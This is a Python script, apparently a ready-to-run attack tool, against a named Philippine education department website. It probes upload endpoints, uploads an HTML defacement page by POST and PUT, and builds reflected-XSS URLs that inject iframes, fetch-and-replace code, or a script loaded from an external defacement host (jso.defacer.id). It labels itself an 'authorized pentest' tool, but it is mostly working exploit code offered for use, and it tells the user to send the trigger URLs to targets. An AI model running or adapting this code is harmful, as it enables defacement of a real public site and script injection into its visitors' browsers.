#!/usr/bin/env python3
"""
depedquezon.com.ph XSS Exploit - HTML Upload & Trigger
Authorized pentest tool for depedquezon.com.ph
"""

import argparse
import requests
import sys
import time
import urllib.parse
from pathlib import Path

requests.packages.urllib3.disable_warnings()

BANNER = """
╔══════════════════════════════════════════════════════╗
║  depedquezon.com.ph XSS Payload Uploader            ║
║  Target: Reflected XSS in 'result' GET parameter    ║
║  Upload: /link/save.php                              ║
╚══════════════════════════════════════════════════════╝
"""

BASE_URL = "https://depedquezon.com.ph"

# ---------- HTML PAYLOAD BUILDER ----------

def build_deface_html(message=None):
    """Build a self-contained HTML defacement payload."""
    m = message or "Security Assessment by Authorized Pentester"
    return f"""<!DOCTYPE html>
<html>
<head><title>Security Assessment</title></head>
<body style="margin:0;background:#000;color:#0f0;font-family:monospace;
     display:flex;align-items:center;justify-content:center;height:100vh;
     flex-direction:column;">
  <h1 style="font-size:3em;text-shadow:0 0 20px #0f0;">PENTEST NOTICE</h1>
  <p style="font-size:1.2em;max-width:600px;text-align:center;">{m}</p>
  <hr style="width:60%;border-color:#0f0;">
  <p style="font-size:0.9em;color:#888;">This page was placed during an authorized security assessment of depedquezon.com.ph</p>
</body>
</html>"""


def build_stealth_payload():
    """Minimal payload that just shows a console notice."""
    return """<script>console.log('Security assessment in progress - depedquezon.com.ph')</script>"""


# ---------- UPLOADER ----------

def probe_upload_endpoints(session):
    """Try various common field names on the upload handler."""
    endpoints = [
        ("/link/save.php", "file"),
        ("/link/save.php", "upload"),
        ("/link/save.php", "fileToUpload"),
        ("/link/save.php", "userfile"),
        ("/link/save.php", "data"),
        ("/link/index.php", "file"),
        ("/link/index.php", "upload"),
        ("/save.php", "file"),
        ("/upload.php", "file"),
    ]

    payload = b"pentest_probe_" + str(time.time()).encode()
    results = []

    for path, field in endpoints:
        url = BASE_URL.rstrip("/") + path
        try:
            r = session.post(
                url,
                files={field: ("probe.txt", payload, "text/plain")},
                timeout=15,
                verify=False,
            )
            results.append((url, field, r.status_code, len(r.text)))
            print(f"  [{r.status_code}] POST {url}  field='{field}'  size={len(r.text)}")
        except Exception as e:
            print(f"  [ERR] POST {url} field='{field}': {e}")
            results.append((url, field, 0, 0))

    return results


def upload_file(session, html_content, filename="index.html", endpoint="/link/save.php", field="file"):
    """Upload a file to the target via multipart POST."""
    url = BASE_URL.rstrip("/") + endpoint
    print(f"\n[*] Uploading '{filename}' to {url} (field: '{field}') ...")

    r = session.post(
        url,
        files={field: (filename, html_content.encode() if isinstance(html_content, str) else html_content, "text/html")},
        timeout=30,
        verify=False,
    )

    print(f"  Status: {r.status_code}")
    print(f"  Response length: {len(r.text)}")

    # Check if the response contains any hint of success
    body_lower = r.text.lower()
    hints = []
    if "success" in body_lower:
        hints.append("found keyword: success")
    if "upload" in body_lower:
        hints.append("found keyword: upload")
    if filename.lower() in body_lower:
        hints.append(f"found filename in response: {filename}")
    if r.status_code == 200:
        hints.append("status 200 (no guarantee of write success)")

    if hints:
        print(f"  [i] Hints: {', '.join(hints)}")
    else:
        print(f"  [!] No success indicators in response")

    return r


def try_put_upload(session, html_content, filename="index.html"):
    """Try PUT method as a fallback."""
    url = f"{BASE_URL}/data_files/{filename}"
    print(f"\n[*] Trying PUT to {url} ...")
    r = session.put(
        url,
        data=html_content.encode() if isinstance(html_content, str) else html_content,
        headers={"Content-Type": "text/html"},
        timeout=15,
        verify=False,
    )
    print(f"  Status: {r.status_code}")
    return r


def verify_file(session, paths):
    """Check if uploaded files are accessible."""
    print(f"\n[*] Checking for uploaded files at common paths ...")
    found = []
    for p in paths:
        url = BASE_URL.rstrip("/") + p
        try:
            r = session.get(url, timeout=10, verify=False)
            status = r.status_code
            size = len(r.text)
            marker = "✓" if status == 200 and size > 100 else " "
            print(f"  [{marker}] {status} {url}  ({size} bytes)")
            if status == 200 and size > 50:
                found.append((url, r.text[:200]))
        except Exception as e:
            print(f"  [ ] ERR {url}: {e}")
    return found


# ---------- XSS TRIGGER ----------

def build_xss_url(uploaded_url, method="iframe"):
    """Build a URL that loads the uploaded HTML via the XSS."""
    if method == "script_src":
        # Loads upload via <script src>
        js_url = uploaded_url
        payload = f"</h1><script src=\"{js_url}\"></script>"
    elif method == "iframe":
        # Loads upload via iframe
        payload = f"</h1><script>document.body.innerHTML='<iframe src=\"{uploaded_url}\" style=\"width:100vw;height:100vh;position:fixed;top:0;left:0;border:none;z-index:9999\"></iframe>'</script>"
    elif method == "fetch_inject":
        # Fetches upload and injects its HTML
        payload = f"</h1><script>fetch('{uploaded_url}').then(r=>r.text()).then(h=>document.documentElement.innerHTML=h)</script>"
    elif method == "self_contained":
        # Use external JS host (your jso.defacer.id link)
        payload = f'</h1><script src="https://jso.defacer.id/raw/nc91wdsbZ7"></script>'
    else:
        raise ValueError(f"Unknown method: {method}")

    encoded = urllib.parse.quote(payload, safe='')
    return f"{BASE_URL}/?result={encoded}"


# ---------- MAIN ----------

def main():
    parser = argparse.ArgumentParser(
        description="depedquezon.com.ph XSS Exploit Tool (Authorized Pentest)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --upload deface.html          # Upload a local HTML file
  %(prog)s --generate                    # Generate and upload test payload
  %(prog)s --xss-only                    # Just generate the XSS trigger URL
  %(prog)s --stealth                     # Upload minimal console-log payload
  %(prog)s --verify                      # Check if previously uploaded files exist
        """,
    )
    parser.add_argument("--upload", "-u", help="Local HTML file to upload")
    parser.add_argument("--generate", "-g", action="store_true", help="Generate and upload a test deface page")
    parser.add_argument("--message", "-m", default="Security Assessment by Authorized Pentester", help="Message for generated page")
    parser.add_argument("--stealth", "-s", action="store_true", help="Upload minimal console-log payload only")
    parser.add_argument("--xss-only", "-x", action="store_true", help="Only generate the XSS URL (no upload)")
    parser.add_argument("--external-js", "-j", action="store_true", help="Use external JS host for XSS (jso.defacer.id)")
    parser.add_argument("--method", choices=["iframe", "fetch_inject", "script_src"], default="iframe", help="XSS injection method (default: iframe)")
    parser.add_argument("--verify", "-v", action="store_true", help="Verify previously uploaded files")
    parser.add_argument("--probe", "-p", action="store_true", help="Probe all upload endpoints")
    parser.add_argument("--output", "-o", help="Save generated XSS URL to file")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    print(BANNER)
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Time:   {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    # --probe: scan upload endpoints
    if args.probe:
        probe_upload_endpoints(s)

    # --verify: check if uploads exist
    if args.verify:
        verify_paths = [
            "/data_files/index.html",
            "/data_files/news/index.html",
            "/img/index.html",
            "/link/index.html",
            "/link/save.php",
            "/index.html",
        ]
        verify_file(s, verify_paths)

    # --xss-only: just print the XSS URL
    if args.xss_only:
        print("[*] Generating XSS URL only (no upload)...\n")
        if args.external_js:
            xss_url = build_xss_url("", method="self_contained")
            print(f"  XSS URL (external JS):\n  {xss_url}")
        else:
            # Dummy URL — user must host the HTML themselves
            print("  [!] --xss-only requires specifying where your payload is hosted.")
            print("  [!] Use --external-js to use your jso.defacer.id link, or")
            print("  [!] use --upload/--generate to also host it on the target.\n")
            if args.external_js:
                pass
            else:
                sys.exit(1)

        if args.output:
            Path(args.output).write_text(xss_url)
            print(f"\n  [✓] Saved to: {args.output}")
        return

    # --upload: upload a local file
    if args.upload:
        path = Path(args.upload)
        if not path.exists():
            print(f"[!] File not found: {args.upload}")
            sys.exit(1)
        html_content = path.read_text(encoding="utf-8", errors="replace")
        filename = path.name

        # Try POST upload
        r1 = upload_file(s, html_content, filename=filename)

        # Also try save.php with common field names
        upload_file(s, html_content, filename=filename, field="uploaded_file")
        upload_file(s, html_content, filename=filename, field="userfile")

        # Try PUT to common paths
        try_put_upload(s, html_content, filename=filename)

        print()

    # --generate: create and upload a test page
    if args.generate or (not args.upload and not args.xss_only and not args.verify and not args.probe):
        html_content = build_deface_html(args.message)
        filename = "pentest_notice.html"

        print("[*] Generated deface page:")
        print(f"  Filename: {filename}")
        print(f"  Size: {len(html_content)} bytes\n")

        r1 = upload_file(s, html_content, filename=filename)
        upload_file(s, html_content, filename=filename, field="uploaded_file")
        upload_file(s, html_content, filename=filename, field="userfile")
        try_put_upload(s, html_content, filename=filename)

    # --stealth: minimal payload
    if args.stealth:
        html_content = build_stealth_payload()
        filename = "pentest_notice.html"
        print("[*] Uploading stealth payload (console.log only)...\n")
        upload_file(s, html_content, filename=filename)

    # Check common paths after any upload attempt
    print(f"\n[*] Checking for uploaded files ...")
    verify_paths = [
        "/data_files/pentest_notice.html",
        "/data_files/news/pentest_notice.html",
        "/img/pentest_notice.html",
        "/link/pentest_notice.html",
        "/pentest_notice.html",
    ]
    # Also check for the original filename
    for p in verify_paths:
        url = BASE_URL.rstrip("/") + p
        try:
            r = s.get(url, timeout=10, verify=False)
            status = r.status_code
            marker = "✓" if status == 200 else " "
            print(f"  [{marker}] {status} {url}")
        except Exception as e:
            print(f"  [ ] ERR {url}: {e}")

    # Generate XSS trigger URL
    print(f"\n{'='*60}")
    print("  XSS TRIGGER URLS")
    print(f"{'='*60}\n")

    # Method 1: Using external JS host (your jso.defacer.id link)
    print("  [1] External JS host (recommended - works every time):")
    ext_url = build_xss_url("", method="self_contained")
    print(f"  {ext_url}\n")

    # Method 2: Iframe loading from uploaded file (if upload succeeded)
    print("  [2] Iframe from uploaded file (if upload succeeded):")
    iframe_url = build_xss_url(f"{BASE_URL}/data_files/{filename}", method="iframe")
    print(f"  {iframe_url}\n")

    # Method 3: Fetch & inject uploaded HTML
    print("  [3] Fetch & inject uploaded HTML:")
    fetch_url = build_xss_url(f"{BASE_URL}/data_files/{filename}", method="fetch_inject")
    print(f"  {fetch_url}\n")

    if args.output:
        combined = f"# External JS:\n{ext_url}\n\n# Iframe:\n{iframe_url}\n\n# Fetch:\n{fetch_url}\n"
        Path(args.output).write_text(combined)
        print(f"  [✓] Saved to: {args.output}")

    print(f"{'='*60}")
    print("  To trigger: paste any XSS URL into a browser or send to target")
    print("  Or use: curl -s -L \"<URL>\" | head -20")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
